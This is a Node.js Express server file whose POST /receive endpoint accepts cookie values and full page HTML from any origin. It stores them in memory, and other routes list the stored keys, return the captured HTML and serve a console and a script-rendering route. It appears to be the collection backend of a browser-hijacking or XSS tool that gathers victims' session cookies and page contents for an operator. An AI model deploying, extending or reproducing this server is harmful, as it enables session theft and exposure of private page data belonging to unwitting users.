require('dotenv').config();
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const fsPromises = require('fs').promises;
const fs = require('fs');
const cors = require('cors');
const ejs = require('ejs')
const app = express();
app.use(cors());
const compression = require('compression');
app.use(compression());
const port = process.env.PORT || 3000;
// SETTING APP PULIC AND VIEWS
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(bodyParser.json({ limit: '1000mb' }));
app.use(bodyParser.urlencoded({ limit: '1000mb', extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine','ejs')
app.set('views', __dirname + '/views');
const htmlContentMap = {};
// IMPORT PAGE & API
const ConsolePage = require("./api/console");
const IndexPage = require("./api/IndexPage");
const ScriptPage = require('./api/scriptrender')
app.get('/api/loadingpages',ScriptPage)


app.post('/receive', async (req, res) => {
  res.header("Access-Control-Allow-Origin", "*");
  const serverName = req.body.cookies;
  const htmlContent = req.body.html;


  if (htmlContent !== undefined && htmlContent.trim() !== '') {
      try {
          // store content in memory instead of database
          htmlContentMap[serverName] = htmlContent;
          console.log(`Data received for Cookie set: ${serverName}`);
          res.status(200).send('Data received successfully');
      } catch (error) {
          console.error('Error storing content in memory:', error);
          res.status(500).send('Internal Server Error');
      }
  } else {
      console.error('Content is Empty!');
      res.status(400).send('Bad Request: Content is empty');
  }
});
app.get('/api/get/server', (req, res) => {
  const serverNames = Object.keys(htmlContentMap);
  
  res.status(200).json({ serverNames });
});
app.get('/api/fetch/content', (req, res) => {
  const serverName = req.query.server;
  const htmlContent = htmlContentMap[serverName];

  if (htmlContent) {
      res.status(200).send(htmlContent);
  } else {
      res.status(404).send('Not Found: Content not available for the specified server');
  }
});

app.get('/receive', (req, res) => {
    console.log(`someone try to get /receive`);
  });
app.get('/',IndexPage)
app.get('/console',ConsolePage)
app.get('/fetch/loadfiles', (req, res) => {
    const publicFolderPath = path.join(__dirname, 'public');
    fs.readdir(publicFolderPath, (err, files) => {
      if (err) {
        console.error('Error reading public folder:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      }
      const htmlFiles = files.filter(file => path.extname(file) === '.html');
      res.json({ fileNames: htmlFiles });
    });
  });
app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
